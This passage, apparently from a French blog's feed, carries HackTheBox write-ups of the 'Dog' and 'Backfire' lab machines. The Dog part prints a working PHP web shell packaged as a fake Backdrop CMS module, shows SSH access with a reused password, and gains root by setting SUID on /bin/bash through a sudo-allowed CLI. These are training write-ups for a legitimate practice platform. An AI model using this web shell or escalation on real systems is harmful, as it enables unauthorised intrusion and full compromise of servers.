&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;TEXT&amp;#34;&lt;/span> &lt;span class="nx">name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">autofocus&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;cmd&amp;#34;&lt;/span> &lt;span class="nx">size&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;80&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;SUBMIT&amp;#34;&lt;/span> &lt;span class="nx">value&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;Execute&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">name&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Block&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">description&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Controls&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">visual&lt;/span> &lt;span class="nx">building&lt;/span> &lt;span class="nx">blocks&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="nx">is&lt;/span> &lt;span class="nx">constructed&lt;/span> &lt;span class="nx">with&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Blocks&lt;/span> &lt;span class="nx">are&lt;/span> &lt;span class="nx">boxes&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">content&lt;/span> &lt;span class="nx">rendered&lt;/span> &lt;span class="nx">into&lt;/span> &lt;span class="nx">an&lt;/span> &lt;span class="nx">area&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">or&lt;/span> &lt;span class="nx">region&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">web&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Layouts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Blocks&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Site&lt;/span> &lt;span class="nx">Architecture&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">BACKDROP_VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">backdrop&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.&lt;/span>&lt;span class="nx">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">configure&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">structure&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">block&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">;&lt;/span> &lt;span class="nx">Added&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="nx">packaging&lt;/span> &lt;span class="nx">script&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">07&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">project&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">backdrop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.27.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">timestamp&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mi">1709862662&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">tar&lt;/span> &lt;span class="nx">cvf&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">tar&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar.PNG"
width="986"
height="653"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_162520f382904bda.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_4f8761190ad46300.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="150"
data-flex-basis="362px"
>
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed.PNG"
width="500"
height="356"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_caf41748980a33a1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_a0f0147f5be960fb.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="337px"
>&lt;/p>
&lt;p>Même si notre nouveau module n&amp;rsquo;est pas listé dans la liste des modules de l&amp;rsquo;application web, nous pouvons y accéder via &lt;code>/modules/shell/shell.php&lt;/code> comme spécifié dans l&amp;rsquo;&lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>exploit&lt;/a>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE.PNG"
width="836"
height="124"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_5d37d8ed15da13e1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_63d10529c5e5d6f1.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="674"
data-flex-basis="1618px"
>&lt;/p>
&lt;p>Dans le dossier &lt;code>/home&lt;/code>, on remarque deux utilisateurs &lt;code>jobert&lt;/code> et &lt;code>johncusack&lt;/code>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users.PNG"
width="774"
height="170"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_eb4f5371c87eae46.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_9389f974789777ed.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="455"
data-flex-basis="1092px"
>&lt;br>
En réutilisant le mot de passe &lt;code>BackDropJ2024DS2024&lt;/code> précédemment trouvé, nous pouvons nous connecter à la machine via SSH en tant que &lt;code>johncusack&lt;/code> et récupérer le flag &lt;code>user.txt&lt;/code>.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="misconfiguration-sudo">Misconfiguration sudo
&lt;/h3>&lt;p>On remarque que &lt;code>johncusack&lt;/code> peut utiliser la CLI &lt;code>bee&lt;/code> en tant que &lt;code>root&lt;/code> grace à sudo.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="hl">&lt;span class="lnt">7
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">sudo&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
Cette CLI &amp;ldquo;permet aux developpeurs d&amp;rsquo;intérargir avec des sites Backdrop&amp;rdquo; comme spécifié sur leur &lt;a class="link" href="https://github.com/backdrop-contrib/bee" target="_blank" rel="noopener"
>GitHub&lt;/a>. Comme indiqué dans la documentation, nous pouvons éxécuter du code PHP.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">bee&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">Evaluate&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">execute&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">arbitrary&lt;/span> &lt;span class="nx">PHP&lt;/span> &lt;span class="nx">code&lt;/span> &lt;span class="nx">after&lt;/span> &lt;span class="nx">bootstrapping&lt;/span> &lt;span class="nx">Backdrop&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>Premièrement, nous allons nous déplacer dans &lt;code>/var/www/html&lt;/code> pour que &lt;code>bee&lt;/code> puisse intérargir avec notre application backdrop.&lt;br>
Ensuite, nous allons ajouter le flag SUID à &lt;code>/bin/bash&lt;/code> afin d&amp;rsquo;obtenir un shell root et récupérer le flag &lt;code>root.txt&lt;/code>.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
&lt;/span>&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="hl">&lt;span class="lnt">8
&lt;/span>&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nf">exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;chmod u+s /bin/bash&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">rwsr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">xr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="mi">1183448&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">18&lt;/span> &lt;span class="mi">2022&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">euid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">groups&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="ressources">Ressources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a>&lt;br>
&lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>RCE exploit - Backdrop v1.27.1&lt;/a>&lt;/p>&lt;/blockquote></description></item><item><title>Backfire - Linux Medium - HTB Writeup</title><link>https://01MI.github.io/fr/p/backfire-htb-writeup-linux-medium/</link><pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/fr/p/backfire-htb-writeup-linux-medium/</guid><description>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire.PNG" alt="Featured image of post Backfire - Linux Medium - HTB Writeup" />&lt;h2 id="résumé">Résumé
&lt;/h2>&lt;p>User Ilya: Exploit Havoc C2: SSRF + RCE&lt;br>
Lateral mouvement vers Sergej: Exploit HardHat C2: Authentification bypass + RCE&lt;br>
Root: Défaut de configuration sudo&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>A l&amp;rsquo;aide d&amp;rsquo;un scan nmap, nous pouvons identifier deux services web, celui accessible sur le port 8000 retiendra notre attention ici.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
